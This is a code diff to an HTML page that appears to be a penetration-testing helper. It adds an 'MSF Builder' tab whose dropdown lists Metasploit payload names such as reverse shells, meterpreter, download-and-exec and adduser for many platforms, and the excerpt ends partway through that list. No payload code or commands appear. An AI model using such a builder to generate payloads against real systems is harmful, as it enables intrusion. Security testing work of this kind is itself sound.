@@ -17,8 +17,7 @@
             /* 导航栏宽度 */
             float: left;
             /* 左浮动 */
-            /* background-color: #f0f0f0; */
-            background-color: rgba(23, 193, 137, 0.66);
+            background-color:deepskyblue;
             /* 背景颜色 */
         }
 
@@ -67,6 +66,12 @@
             color: black;
             font-size: 26px;
         }
+
+        select {
+            height: 50px;
+            width: 300px;
+            font-size: medium;
+        }
     </style>
 </head>
 
@@ -99,6 +104,9 @@
                         style="color: #FFD700;"></i>&nbsp;&nbsp;SQL Injection</a></li>
             <li><a href="#" onclick="showContent('content12')"><i class="fa fa-folder fa-lg"
                         style="color: #FFD700;"></i>&nbsp;&nbsp;LFI</a></li>
+            
+            <li><a href="#" onclick="showContent('content14')"><i class="fa fa-folder fa-lg"
+                        style="color: #FFD700;"></i>&nbsp;&nbsp;MSF Builder</a></li>
         </ul>
     </div>
     <div id="content">
@@ -823,6 +831,763 @@
             </span>
         </div>
 
+
+      
+
+        <div id="content14" class="content-item">
+
+            <div style="background-color:blanchedalmond; height: 300px;overflow-y: auto;">
+                <span style="color: red;">*</span>
+                Payload：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                <select onmouseout="msfbuilderdisplayText()" id="msfbuilderinputText">
+                    <option value="aix/ppc/shell_bind_tcp">aix/ppc/shell_bind_tcp</option>
+                    <option value="aix/ppc/shell_find_port">aix/ppc/shell_find_port</option>
+                    <option value="aix/ppc/shell_interact">aix/ppc/shell_interact</option>
+                    <option value="aix/ppc/shell_reverse_tcp">aix/ppc/shell_reverse_tcp</option>
+                    <option value="android/meterpreter/reverse_http">android/meterpreter/reverse_http</option>
+                    <option value="android/meterpreter/reverse_https">android/meterpreter/reverse_https</option>
+                    <option value="android/meterpreter/reverse_tcp">android/meterpreter/reverse_tcp</option>
+                    <option value="android/meterpreter_reverse_http">android/meterpreter_reverse_http</option>
+                    <option value="android/meterpreter_reverse_https">android/meterpreter_reverse_https</option>
+                    <option value="android/meterpreter_reverse_tcp">android/meterpreter_reverse_tcp</option>
+                    <option value="android/shell/reverse_http">android/shell/reverse_http</option>
+                    <option value="android/shell/reverse_https">android/shell/reverse_https</option>
+                    <option value="android/shell/reverse_tcp">android/shell/reverse_tcp</option>
+                    <option value="apple_ios/aarch64/meterpreter_reverse_http">apple_ios/aarch64/meterpreter_reverse_http</option>
+                    <option value="apple_ios/aarch64/meterpreter_reverse_https">apple_ios/aarch64/meterpreter_reverse_https</option>
+                    <option value="apple_ios/aarch64/meterpreter_reverse_tcp">apple_ios/aarch64/meterpreter_reverse_tcp</option>
+                    <option value="apple_ios/aarch64/shell_reverse_tcp">apple_ios/aarch64/shell_reverse_tcp</option>
+                    <option value="bsd/sparc/shell_bind_tcp">bsd/sparc/shell_bind_tcp</option>
+                    <option value="bsd/sparc/shell_reverse_tcp">bsd/sparc/shell_reverse_tcp</option>
+                    <option value="bsd/x64/exec">bsd/x64/exec</option>
+                    <option value="bsd/x64/shell_bind_ipv6_tcp">bsd/x64/shell_bind_ipv6_tcp</option>
+                    <option value="bsd/x64/shell_bind_tcp">bsd/x64/shell_bind_tcp</option>
+                    <option value="bsd/x64/shell_bind_tcp_small">bsd/x64/shell_bind_tcp_small</option>
+                    <option value="bsd/x64/shell_reverse_ipv6_tcp">bsd/x64/shell_reverse_ipv6_tcp</option>
+                    <option value="bsd/x64/shell_reverse_tcp">bsd/x64/shell_reverse_tcp</option>
+                    <option value="bsd/x64/shell_reverse_tcp_small">bsd/x64/shell_reverse_tcp_small</option>
+                    <option value="bsd/x86/exec">bsd/x86/exec</option>
+                    <option value="bsd/x86/metsvc_bind_tcp">bsd/x86/metsvc_bind_tcp</option>
+                    <option value="bsd/x86/metsvc_reverse_tcp">bsd/x86/metsvc_reverse_tcp</option>
+                    <option value="bsd/x86/shell/bind_ipv6_tcp">bsd/x86/shell/bind_ipv6_tcp</option>
+                    <option value="bsd/x86/shell/bind_tcp">bsd/x86/shell/bind_tcp</option>
+                    <option value="bsd/x86/shell/find_tag">bsd/x86/shell/find_tag</option>
+                    <option value="bsd/x86/shell/reverse_ipv6_tcp">bsd/x86/shell/reverse_ipv6_tcp</option>
+                    <option value="bsd/x86/shell/reverse_tcp">bsd/x86/shell/reverse_tcp</option>
+                    <option value="bsd/x86/shell_bind_tcp">bsd/x86/shell_bind_tcp</option>
+                    <option value="bsd/x86/shell_bind_tcp_ipv6">bsd/x86/shell_bind_tcp_ipv6</option>
+                    <option value="bsd/x86/shell_find_port">bsd/x86/shell_find_port</option>
+                    <option value="bsd/x86/shell_find_tag">bsd/x86/shell_find_tag</option>
+                    <option value="bsd/x86/shell_reverse_tcp">bsd/x86/shell_reverse_tcp</option>
+                    <option value="bsd/x86/shell_reverse_tcp_ipv6">bsd/x86/shell_reverse_tcp_ipv6</option>
+                    <option value="bsdi/x86/shell/bind_tcp">bsdi/x86/shell/bind_tcp</option>
+                    <option value="bsdi/x86/shell/reverse_tcp">bsdi/x86/shell/reverse_tcp</option>
+                    <option value="bsdi/x86/shell_bind_tcp">bsdi/x86/shell_bind_tcp</option>
+                    <option value="bsdi/x86/shell_find_port">bsdi/x86/shell_find_port</option>
+                    <option value="bsdi/x86/shell_reverse_tcp">bsdi/x86/shell_reverse_tcp</option>
+                    <option value="cmd/mainframe/apf_privesc_jcl">cmd/mainframe/apf_privesc_jcl</option>
+                    <option value="cmd/mainframe/bind_shell_jcl">cmd/mainframe/bind_shell_jcl</option>
+                    <option value="cmd/mainframe/generic_jcl">cmd/mainframe/generic_jcl</option>
+                    <option value="cmd/mainframe/reverse_shell_jcl">cmd/mainframe/reverse_shell_jcl</option>
+                    <option value="cmd/unix/bind_awk">cmd/unix/bind_awk</option>
+                    <option value="cmd/unix/bind_inetd">cmd/unix/bind_inetd</option>
+                    <option value="cmd/unix/bind_lua">cmd/unix/bind_lua</option>
+                    <option value="cmd/unix/bind_netcat">cmd/unix/bind_netcat</option>
+                    <option value="cmd/unix/bind_netcat_gaping">cmd/unix/bind_netcat_gaping</option>
+                    <option value="cmd/unix/bind_netcat_gaping_ipv6">cmd/unix/bind_netcat_gaping_ipv6</option>
+                    <option value="cmd/unix/bind_nodejs">cmd/unix/bind_nodejs</option>
+                    <option value="cmd/unix/bind_perl">cmd/unix/bind_perl</option>
+                    <option value="cmd/unix/bind_perl_ipv6">cmd/unix/bind_perl_ipv6</option>
+                    <option value="cmd/unix/bind_r">cmd/unix/bind_r</option>
+                    <option value="cmd/unix/bind_ruby">cmd/unix/bind_ruby</option>
+                    <option value="cmd/unix/bind_ruby_ipv6">cmd/unix/bind_ruby_ipv6</option>
+                    <option value="cmd/unix/bind_socat_udp">cmd/unix/bind_socat_udp</option>
+                    <option value="cmd/unix/bind_stub">cmd/unix/bind_stub</option>
+                    <option value="cmd/unix/bind_zsh">cmd/unix/bind_zsh</option>
+                    <option value="cmd/unix/generic">cmd/unix/generic</option>
+                    <option value="cmd/unix/interact">cmd/unix/interact</option>
+                    <option value="cmd/unix/reverse">cmd/unix/reverse</option>
+                    <option value="cmd/unix/reverse_awk">cmd/unix/reverse_awk</option>
+                    <option value="cmd/unix/reverse_bash">cmd/unix/reverse_bash</option>
+                    <option value="cmd/unix/reverse_bash_telnet_ssl">cmd/unix/reverse_bash_telnet_ssl</option>
+                    <option value="cmd/unix/reverse_ksh">cmd/unix/reverse_ksh</option>
+                    <option value="cmd/unix/reverse_lua">cmd/unix/reverse_lua</option>
+                    <option value="cmd/unix/reverse_ncat_ssl">cmd/unix/reverse_ncat_ssl</option>
+                    <option value="cmd/unix/reverse_netcat">cmd/unix/reverse_netcat</option>
+                    <option value="cmd/unix/reverse_netcat_gaping">cmd/unix/reverse_netcat_gaping</option>
+                    <option value="cmd/unix/reverse_nodejs">cmd/unix/reverse_nodejs</option>
+                    <option value="cmd/unix/reverse_openssl">cmd/unix/reverse_openssl</option>
+                    <option value="cmd/unix/reverse_perl">cmd/unix/reverse_perl</option>
+                    <option value="cmd/unix/reverse_perl_ssl">cmd/unix/reverse_perl_ssl</option>
+                    <option value="cmd/unix/reverse_php_ssl">cmd/unix/reverse_php_ssl</option>
+                    <option value="cmd/unix/reverse_python">cmd/unix/reverse_python</option>
+                    <option value="cmd/unix/reverse_python_ssl">cmd/unix/reverse_python_ssl</option>
+                    <option value="cmd/unix/reverse_r">cmd/unix/reverse_r</option>
+                    <option value="cmd/unix/reverse_ruby">cmd/unix/reverse_ruby</option>
+                    <option value="cmd/unix/reverse_ruby_ssl">cmd/unix/reverse_ruby_ssl</option>
+                    <option value="cmd/unix/reverse_socat_udp">cmd/unix/reverse_socat_udp</option>
+                    <option value="cmd/unix/reverse_ssl_double_telnet">cmd/unix/reverse_ssl_double_telnet</option>
+                    <option value="cmd/unix/reverse_stub">cmd/unix/reverse_stub</option>
+                    <option value="cmd/unix/reverse_zsh">cmd/unix/reverse_zsh</option>
+                    <option value="cmd/windows/adduser">cmd/windows/adduser</option>
+                    <option value="cmd/windows/bind_lua">cmd/windows/bind_lua</option>
+                    <option value="cmd/windows/bind_perl">cmd/windows/bind_perl</option>
+                    <option value="cmd/windows/bind_perl_ipv6">cmd/windows/bind_perl_ipv6</option>
+                    <option value="cmd/windows/bind_ruby">cmd/windows/bind_ruby</option>
+                    <option value="cmd/windows/download_eval_vbs">cmd/windows/download_eval_vbs</option>
+                    <option value="cmd/windows/download_exec_vbs">cmd/windows/download_exec_vbs</option>
+                    <option value="cmd/windows/generic">cmd/windows/generic</option>
+                    <option value="cmd/windows/powershell_bind_tcp">cmd/windows/powershell_bind_tcp</option>
+                    <option value="cmd/windows/powershell_reverse_tcp">cmd/windows/powershell_reverse_tcp</option>
+                    <option value="cmd/windows/reverse_lua">cmd/windows/reverse_lua</option>
+                    <option value="cmd/windows/reverse_perl">cmd/windows/reverse_perl</option>
+                    <option value="cmd/windows/reverse_powershell">cmd/windows/reverse_powershell</option>
+                    <option value="cmd/windows/reverse_ruby">cmd/windows/reverse_ruby</option>
+                    <option value="firefox/exec">firefox/exec</option>
+                    <option value="firefox/shell_bind_tcp">firefox/shell_bind_tcp</option>
+                    <option value="firefox/shell_reverse_tcp">firefox/shell_reverse_tcp</option>
+                    <option value="generic/custom">generic/custom</option>
+                    <option value="generic/debug_trap">generic/debug_trap</option>
+                    <option value="generic/shell_bind_tcp">generic/shell_bind_tcp</option>
+                    <option value="generic/shell_reverse_tcp">generic/shell_reverse_tcp</option>
+                    <option value="generic/tight_loop">generic/tight_loop</option>
+                    <option value="java/jsp_shell_bind_tcp">java/jsp_shell_bind_tcp</option>
+                    <option value="java/jsp_shell_reverse_tcp">java/jsp_shell_reverse_tcp</option>
+                    <option value="java/meterpreter/bind_tcp">java/meterpreter/bind_tcp</option>
+                    <option value="java/meterpreter/reverse_http">java/meterpreter/reverse_http</option>
+                    <option value="java/meterpreter/reverse_https">java/meterpreter/reverse_https</option>
+                    <option value="java/meterpreter/reverse_tcp">java/meterpreter/reverse_tcp</option>
+                    <option value="java/shell/bind_tcp">java/shell/bind_tcp</option>
+                    <option value="java/shell/reverse_tcp">java/shell/reverse_tcp</option>
+                    <option value="java/shell_reverse_tcp">java/shell_reverse_tcp</option>
+                    <option value="linux/aarch64/meterpreter/reverse_tcp">linux/aarch64/meterpreter/reverse_tcp</option>
+                    <option value="linux/aarch64/meterpreter_reverse_http">linux/aarch64/meterpreter_reverse_http</option>
+                    <option value="linux/aarch64/meterpreter_reverse_https">linux/aarch64/meterpreter_reverse_https</option>
+                    <option value="linux/aarch64/meterpreter_reverse_tcp">linux/aarch64/meterpreter_reverse_tcp</option>
+                    <option value="linux/aarch64/shell/reverse_tcp">linux/aarch64/shell/reverse_tcp</option>
+                    <option value="linux/aarch64/shell_reverse_tcp">linux/aarch64/shell_reverse_tcp</option>
+                    <option value="linux/armbe/meterpreter_reverse_http">linux/armbe/meterpreter_reverse_http</option>
+                    <option value="linux/armbe/meterpreter_reverse_https">linux/armbe/meterpreter_reverse_https</option>
+                    <option value="linux/armbe/meterpreter_reverse_tcp">linux/armbe/meterpreter_reverse_tcp</option>
+                    <option value="linux/armbe/shell_bind_tcp">linux/armbe/shell_bind_tcp</option>
+                    <option value="linux/armle/adduser">linux/armle/adduser</option>
+                    <option value="linux/armle/exec">linux/armle/exec</option>
+                    <option value="linux/armle/meterpreter/bind_tcp">linux/armle/meterpreter/bind_tcp</option>
+                    <option value="linux/armle/meterpreter/reverse_tcp">linux/armle/meterpreter/reverse_tcp</option>
+                    <option value="linux/armle/meterpreter_reverse_http">linux/armle/meterpreter_reverse_http</option>
+                    <option value="linux/armle/meterpreter_reverse_https">linux/armle/meterpreter_reverse_https</option>
+                    <option value="linux/armle/meterpreter_reverse_tcp">linux/armle/meterpreter_reverse_tcp</option>
+                    <option value="linux/armle/shell/bind_tcp">linux/armle/shell/bind_tcp</option>
+                    <option value="linux/armle/shell/reverse_tcp">linux/armle/shell/reverse_tcp</option>
+                    <option value="linux/armle/shell_bind_tcp">linux/armle/shell_bind_tcp</option>
+                    <option value="linux/armle/shell_reverse_tcp">linux/armle/shell_reverse_tcp</option>
+                    <option value="linux/mips64/meterpreter_reverse_http">linux/mips64/meterpreter_reverse_http</option>
+                    <option value="linux/mips64/meterpreter_reverse_https">linux/mips64/meterpreter_reverse_https</option>
+                    <option value="linux/mips64/meterpreter_reverse_tcp">linux/mips64/meterpreter_reverse_tcp</option>
+                    <option value="linux/mipsbe/exec">linux/mipsbe/exec</option>
+                    <option value="linux/mipsbe/meterpreter/reverse_tcp">linux/mipsbe/meterpreter/reverse_tcp</option>
+                    <option value="linux/mipsbe/meterpreter_reverse_http">linux/mipsbe/meterpreter_reverse_http</option>
+                    <option value="linux/mipsbe/meterpreter_reverse_https">linux/mipsbe/meterpreter_reverse_https</option>
+                    <option value="linux/mipsbe/meterpreter_reverse_tcp">linux/mipsbe/meterpreter_reverse_tcp</option>
+                    <option value="linux/mipsbe/reboot">linux/mipsbe/reboot</option>
+                    <option value="linux/mipsbe/shell/reverse_tcp">linux/mipsbe/shell/reverse_tcp</option>
+                    <option value="linux/mipsbe/shell_bind_tcp">linux/mipsbe/shell_bind_tcp</option>
+                    <option value="linux/mipsbe/shell_reverse_tcp">linux/mipsbe/shell_reverse_tcp</option>
+                    <option value="linux/mipsle/exec">linux/mipsle/exec</option>
+                    <option value="linux/mipsle/meterpreter/reverse_tcp">linux/mipsle/meterpreter/reverse_tcp</option>
+                    <option value="linux/mipsle/meterpreter_reverse_http">linux/mipsle/meterpreter_reverse_http</option>
+                    <option value="linux/mipsle/meterpreter_reverse_https">linux/mipsle/meterpreter_reverse_https</option>
+                    <option value="linux/mipsle/meterpreter_reverse_tcp">linux/mipsle/meterpreter_reverse_tcp</option>
+                    <option value="linux/mipsle/reboot">linux/mipsle/reboot</option>
+                    <option value="linux/mipsle/shell/reverse_tcp">linux/mipsle/shell/reverse_tcp</option>
+                    <option value="linux/mipsle/shell_bind_tcp">linux/mipsle/shell_bind_tcp</option>
+                    <option value="linux/mipsle/shell_reverse_tcp">linux/mipsle/shell_reverse_tcp</option>
+                    <option value="linux/ppc/meterpreter_reverse_http">linux/ppc/meterpreter_reverse_http</option>
+                    <option value="linux/ppc/meterpreter_reverse_https">linux/ppc/meterpreter_reverse_https</option>
+                    <option value="linux/ppc/meterpreter_reverse_tcp">linux/ppc/meterpreter_reverse_tcp</option>
+                    <option value="linux/ppc/shell_bind_tcp">linux/ppc/shell_bind_tcp</option>
+                    <option value="linux/ppc/shell_find_port">linux/ppc/shell_find_port</option>
+                    <option value="linux/ppc/shell_reverse_tcp">linux/ppc/shell_reverse_tcp</option>
+                    <option value="linux/ppc64/shell_bind_tcp">linux/ppc64/shell_bind_tcp</option>
+                    <option value="linux/ppc64/shell_find_port">linux/ppc64/shell_find_port</option>
+                    <option value="linux/ppc64/shell_reverse_tcp">linux/ppc64/shell_reverse_tcp</option>
+                    <option value="linux/ppc64le/meterpreter_reverse_http">linux/ppc64le/meterpreter_reverse_http</option>
+                    <option value="linux/ppc64le/meterpreter_reverse_https">linux/ppc64le/meterpreter_reverse_https</option>
+                    <option value="linux/ppc64le/meterpreter_reverse_tcp">linux/ppc64le/meterpreter_reverse_tcp</option>
+                    <option value="linux/ppce500v2/meterpreter_reverse_http">linux/ppce500v2/meterpreter_reverse_http</option>
+                    <option value="linux/ppce500v2/meterpreter_reverse_https">linux/ppce500v2/meterpreter_reverse_https</option>
+                    <option value="linux/ppce500v2/meterpreter_reverse_tcp">linux/ppce500v2/meterpreter_reverse_tcp</option>
+                    <option value="linux/x64/exec">linux/x64/exec</option>
+                    <option value="linux/x64/meterpreter/bind_tcp">linux/x64/meterpreter/bind_tcp</option>
+                    <option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option>
+                    <option value="linux/x64/meterpreter_reverse_http">linux/x64/meterpreter_reverse_http</option>
+                    <option value="linux/x64/meterpreter_reverse_https">linux/x64/meterpreter_reverse_https</option>
+                    <option value="linux/x64/meterpreter_reverse_tcp">linux/x64/meterpreter_reverse_tcp</option>
+                    <option value="linux/x64/shell/bind_tcp">linux/x64/shell/bind_tcp</option>
+                    <option value="linux/x64/shell/reverse_tcp">linux/x64/shell/reverse_tcp</option>
+                    <option value="linux/x64/shell_bind_tcp">linux/x64/shell_bind_tcp</option>
+                    <option value="linux/x64/shell_bind_tcp_random_port">linux/x64/shell_bind_tcp_random_port</option>
+                    <option value="linux/x64/shell_find_port">linux/x64/shell_find_port</option>
+                    <option value="linux/x64/shell_reverse_tcp">linux/x64/shell_reverse_tcp</option>
+                    <option value="linux/x86/adduser">linux/x86/adduser</option>
+                    <option value="linux/x86/chmod">linux/x86/chmod</option>
+                    <option value="linux/x86/exec">linux/x86/exec</option>
+                    <option value="linux/x86/meterpreter/bind_ipv6">linux/x86/meterpreter/bind_ipv6</option>
+                    <option value="linux/x86/meterpreter/bind_ipv6_tcp_uuid">linux/x86/meterpreter/bind_ipv6_tcp_uuid</option>
+                    <option value="linux/x86/meterpreter/bind_nonx_tcp">linux/x86/meterpreter/bind_nonx_tcp</option>
+                    <option value="linux/x86/meterpreter/bind_tcp">linux/x86/meterpreter/bind_tcp</option>
+                    <option value="linux/x86/meterpreter/bind_tcp_uuid">linux/x86/meterpreter/bind_tcp_uuid</option>
+                    <option value="linux/x86/meterpreter/find_tag">linux/x86/meterpreter/find_tag</option>
+                    <option value="linux/x86/meterpreter/reverse_ipv6_tcp">linux/x86/meterpreter/reverse_ipv6_tcp</option>
+                    <option value="linux/x86/meterpreter/reverse_nonx_tcp">linux/x86/meterpreter/reverse_nonx_tcp</option>
+                    <option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option>
+                    <option value="linux/x86/meterpreter/reverse_tcp_uuid">linux/x86/meterpreter/reverse_tcp_uuid</option>
+                    <option value="linux/x86/meterpreter_reverse_http">linux/x86/meterpreter_reverse_http</option>
+                    <option value="linux/x86/meterpreter_reverse_https">linux/x86/meterpreter_reverse_https</option>
+                    <option value="linux/x86/meterpreter_reverse_tcp">linux/x86/meterpreter_reverse_tcp</option>
+                    <option value="linux/x86/metsvc_bind_tcp">linux/x86/metsvc_bind_tcp</option>
+                    <option value="linux/x86/metsvc_reverse_tcp">linux/x86/metsvc_reverse_tcp</option>
+                    <option value="linux/x86/read_file">linux/x86/read_file</option>
+                    <option value="linux/x86/shell/bind_ipv6_tcp">linux/x86/shell/bind_ipv6_tcp</option>
+                    <option value="linux/x86/shell/bind_ipv6_tcp_uuid">linux/x86/shell/bind_ipv6_tcp_uuid</option>
+                    <option value="linux/x86/shell/bind_nonx_tcp">linux/x86/shell/bind_nonx_tcp</option>
+                    <option value="linux/x86/shell/bind_tcp">linux/x86/shell/bind_tcp</option>
+                    <option value="linux/x86/shell/bind_tcp_uuid">linux/x86/shell/bind_tcp_uuid</option>
+                    <option value="linux/x86/shell/find_tag">linux/x86/shell/find_tag</option>
+                    <option value="linux/x86/shell/reverse_ipv6_tcp">linux/x86/shell/reverse_ipv6_tcp</option>
+                    <option value="linux/x86/shell/reverse_nonx_tcp">linux/x86/shell/reverse_nonx_tcp</option>
+                    <option value="linux/x86/shell/reverse_tcp">linux/x86/shell/reverse_tcp</option>
+                    <option value="linux/x86/shell/reverse_tcp_uuid">linux/x86/shell/reverse_tcp_uuid</option>
+                    <option value="linux/x86/shell_bind_ipv6_tcp">linux/x86/shell_bind_ipv6_tcp</option>
+                    <option value="linux/x86/shell_bind_tcp">linux/x86/shell_bind_tcp</option>
+                    <option value="linux/x86/shell_bind_tcp_random_port">linux/x86/shell_bind_tcp_random_port</option>
+                    <option value="linux/x86/shell_find_port">linux/x86/shell_find_port</option>
+                    <option value="linux/x86/shell_find_tag">linux/x86/shell_find_tag</option>
+                    <option value="linux/x86/shell_reverse_tcp">linux/x86/shell_reverse_tcp</option>
+                    <option value="linux/x86/shell_reverse_tcp_ipv6">linux/x86/shell_reverse_tcp_ipv6</option>
+                    <option value="linux/zarch/meterpreter_reverse_http">linux/zarch/meterpreter_reverse_http</option>
+                    <option value="linux/zarch/meterpreter_reverse_https">linux/zarch/meterpreter_reverse_https</option>
+                    <option value="linux/zarch/meterpreter_reverse_tcp">linux/zarch/meterpreter_reverse_tcp</option>
+                    <option value="mainframe/shell_reverse_tcp">mainframe/shell_reverse_tcp</option>
+                    <option value="multi/meterpreter/reverse_http">multi/meterpreter/reverse_http</option>
+                    <option value="multi/meterpreter/reverse_https">multi/meterpreter/reverse_https</option>
+                    <option value="netware/shell/reverse_tcp">netware/shell/reverse_tcp</option>
+                    <option value="nodejs/shell_bind_tcp">nodejs/shell_bind_tcp</option>
+                    <option value="nodejs/shell_reverse_tcp">nodejs/shell_reverse_tcp</option>
+                    <option value="nodejs/shell_reverse_tcp_ssl">nodejs/shell_reverse_tcp_ssl</option>
+                    <option value="osx/armle/execute/bind_tcp">osx/armle/execute/bind_tcp</option>
+                    <option value="osx/armle/execute/reverse_tcp">osx/armle/execute/reverse_tcp</option>
+                    <option value="osx/armle/shell/bind_tcp">osx/armle/shell/bind_tcp</option>
+                    <option value="osx/armle/shell/reverse_tcp">osx/armle/shell/reverse_tcp</option>
+                    <option value="osx/armle/shell_bind_tcp">osx/armle/shell_bind_tcp</option>
+                    <option value="osx/armle/shell_reverse_tcp">osx/armle/shell_reverse_tcp</option>
+                    <option value="osx/armle/vibrate">osx/armle/vibrate</option>
+                    <option value="osx/ppc/shell/bind_tcp">osx/ppc/shell/bind_tcp</option>
+                    <option value="osx/ppc/shell/find_tag">osx/ppc/shell/find_tag</option>
+                    <option value="osx/ppc/shell/reverse_tcp">osx/ppc/shell/reverse_tcp</option>
+                    <option value="osx/ppc/shell_bind_tcp">osx/ppc/shell_bind_tcp</option>
+                    <option value="osx/ppc/shell_reverse_tcp">osx/ppc/shell_reverse_tcp</option>
+                    <option value="osx/x64/dupandexecve/bind_tcp">osx/x64/dupandexecve/bind_tcp</option>
+                    <option value="osx/x64/dupandexecve/reverse_tcp">osx/x64/dupandexecve/reverse_tcp</option>
+                    <option value="osx/x64/exec">osx/x64/exec</option>
+                    <option value="osx/x64/meterpreter/bind_tcp">osx/x64/meterpreter/bind_tcp</option>
+                    <option value="osx/x64/meterpreter/reverse_tcp">osx/x64/meterpreter/reverse_tcp</option>
+                    <option value="osx/x64/meterpreter/reverse_http">osx/x64/meterpreter/reverse_http</option>
+                    <option value="osx/x64/meterpreter/reverse_https">osx/x64/meterpreter/reverse_https</option>
+                    <option value="osx/x64/meterpreter_reverse_tcp">osx/x64/meterpreter_reverse_tcp</option>
+                    <option value="osx/x64/say">osx/x64/say</option>
+                    <option value="osx/x64/shell_bind_tcp">osx/x64/shell_bind_tcp</option>
+                    <option value="osx/x64/shell_find_tag">osx/x64/shell_find_tag </option>
+                    <option value="osx/x64/shell_reverse_tcp">osx/x64/shell_reverse_tcp</option>
+                    <option value="osx/x86/bundleinject/bind_tcp">osx/x86/bundleinject/bind_tcp</option>
+                    <option value="osx/x86/bundleinject/reverse_tcp">osx/x86/bundleinject/reverse_tcp</option>
+                    <option value="osx/x86/exec">osx/x86/exec</option>
+                    <option value="osx/x86/isight/bind_tcp">osx/x86/isight/bind_tcp</option>
+                    <option value="osx/x86/isight/reverse_tcp">osx/x86/isight/reverse_tcp</option>
+                    <option value="osx/x86/shell_bind_tcp">osx/x86/shell_bind_tcp</option>
+                    <option value="osx/x86/shell_find_port">osx/x86/shell_find_port</option>
+                    <option value="osx/x86/shell_reverse_tcp">osx/x86/shell_reverse_tcp</option>
+                    <option value="osx/x86/vforkshell/bind_tcp">osx/x86/vforkshell/bind_tcp</option>
+                    <option value="osx/x86/vforkshell/reverse_tcp">osx/x86/vforkshell/reverse_tcp</option>
+                    <option value="osx/x86/vforkshell_bind_tcp">osx/x86/vforkshell_bind_tcp</option>
+                    <option value="osx/x86/vforkshell_reverse_tcp">osx/x86/vforkshell_reverse_tcp</option>
+                    <option value="php/bind_perl">php/bind_perl</option>
+                    <option value="php/bind_perl_ipv6">php/bind_perl_ipv6</option>
+                    <option value="php/bind_php">php/bind_php</option>
+                    <option value="php/bind_php_ipv6">php/bind_php_ipv6</option>
+                    <option value="php/download_exec">php/download_exec</option>
+                    <option value="php/exec">php/exec</option>
+                    <option value="php/meterpreter/bind_tcp">php/meterpreter/bind_tcp</option>
+                    <option value="php/meterpreter/bind_tcp_ipv6">php/meterpreter/bind_tcp_ipv6</option>
+                    <option value="php/meterpreter/bind_tcp_ipv6_uuid">php/meterpreter/bind_tcp_ipv6_uuid</option>
+                    <option value="php/meterpreter/bind_tcp_uuid ">php/meterpreter/bind_tcp_uuid</option>
+                    <option value="php/meterpreter/reverse_tcp">php/meterpreter/reverse_tcp</option>
+                    <option value="php/meterpreter/reverse_tcp_uuid">php/meterpreter/reverse_tcp_uuid</option>
+                    <option value="php/meterpreter_reverse_tcp">php/meterpreter_reverse_tcp</option>
+                    <option value="php/reverse_perl">php/reverse_perl</option>
+                    <option value="php/reverse_php">php/reverse_php</option>
+                    <option value="php/shell_findsock">php/shell_findsock</option>
+                    <option value="python/meterpreter/bind_tcp">python/meterpreter/bind_tcp</option>
+                    <option value="python/meterpreter/bind_tcp_uuid">python/meterpreter/bind_tcp_uuid</option>
+                    <option value="python/meterpreter/reverse_http">python/meterpreter/reverse_http</option>
+                    <option value="python/meterpreter/reverse_https">python/meterpreter/reverse_https</option>
+                    <option value="python/meterpreter/reverse_tcp">python/meterpreter/reverse_tcp</option>
+                    <option value="python/meterpreter/reverse_tcp_ssl">python/meterpreter/reverse_tcp_ssl</option>
+                    <option value="python/meterpreter/reverse_tcp_uuid">python/meterpreter/reverse_tcp_uuid</option>
+                    <option value="python/meterpreter_bind_tcp">python/meterpreter_bind_tcp</option>
+                    <option value="python/meterpreter_reverse_http">python/meterpreter_reverse_http</option>
+                    <option value="python/meterpreter_reverse_https">python/meterpreter_reverse_https</option>
+                    <option value="python/meterpreter_reverse_tcp">python/meterpreter_reverse_tcp</option>
+                    <option value="python/pingback_bind_tcp">python/pingback_bind_tcp</option>
+                    <option value="python/pingback_reverse_tcp">python/pingback_reverse_tcp</option>
+                    <option value="python/shell_bind_tcp">python/shell_bind_tcp</option>
+                    <option value="python/shell_reverse_tcp">python/shell_reverse_tcp</option>
+                    <option value="python/shell_reverse_tcp_ssl">python/shell_reverse_tcp_ssl</option>
+                    <option value="python/shell_reverse_udp">python/shell_reverse_udp</option>
+                    <option value="r/shell_bind_tcp">r/shell_bind_tcp</option>
+                    <option value="r/shell_reverse_tcp">r/shell_reverse_tcp</option>
+                    <option value="ruby/pingback_bind_tcp">ruby/pingback_bind_tcp</option>
+                    <option value="ruby/pingback_reverse_tcp">ruby/pingback_reverse_tcp</option>
+                    <option value="ruby/shell_bind_tcp">ruby/shell_bind_tcp</option>
+                    <option value="ruby/shell_bind_tcp_ipv6">ruby/shell_bind_tcp_ipv6</option>
+                    <option value="ruby/shell_reverse_tcp">ruby/shell_reverse_tcp</option>
+                    <option value="ruby/shell_reverse_tcp_ssl">ruby/shell_reverse_tcp_ssl</option>
+                    <option value="solaris/sparc/shell_bind_tcp">solaris/sparc/shell_bind_tcp</option>
+                    <option value="solaris/sparc/shell_find_port">solaris/sparc/shell_find_port</option>
+                    <option value="solaris/sparc/shell_reverse_tcp">solaris/sparc/shell_reverse_tcp</option>
+                    <option value="solaris/x86/shell_bind_tcp">solaris/x86/shell_bind_tcp</option>
+                    <option value="solaris/x86/shell_find_port">solaris/x86/shell_find_port</option>
+                    <option value="solaris/x86/shell_reverse_tcp">solaris/x86/shell_reverse_tcp</option>
+                    <option value="tty/unix/interact ">tty/unix/interact </option>
+                    <option value="windows/adduser">windows/adduser</option>
+                    <option value="windows/dllinject/bind_hidden_ipknock_tcp">windows/dllinject/bind_hidden_ipknock_tcp</option>
+                    <option value="windows/dllinject/bind_hidden_tcp">windows/dllinject/bind_hidden_tcp</option>
+                    <option value="windows/dllinject/bind_ipv6_tcp">windows/dllinject/bind_ipv6_tcp</option>
+                    <option value="windows/dllinject/bind_ipv6_tcp_uuid">windows/dllinject/bind_ipv6_tcp_uuid</option>
+                    <option value="windows/dllinject/bind_named_pipe">windows/dllinject/bind_named_pipe</option>
+                    <option value="windows/dllinject/bind_nonx_tcp">windows/dllinject/bind_nonx_tcp</option>
+                    <option value="windows/dllinject/bind_tcp">windows/dllinject/bind_tcp</option>
+                    <option value="windows/dllinject/bind_tcp_rc4">windows/dllinject/bind_tcp_rc4</option>
+                    <option value="windows/dllinject/bind_tcp_uuid">windows/dllinject/bind_tcp_uuid</option>
+                    <option value="windows/dllinject/find_tag">windows/dllinject/find_tag</option>
+                    <option value="windows/dllinject/reverse_hop_http">windows/dllinject/reverse_hop_http</option>
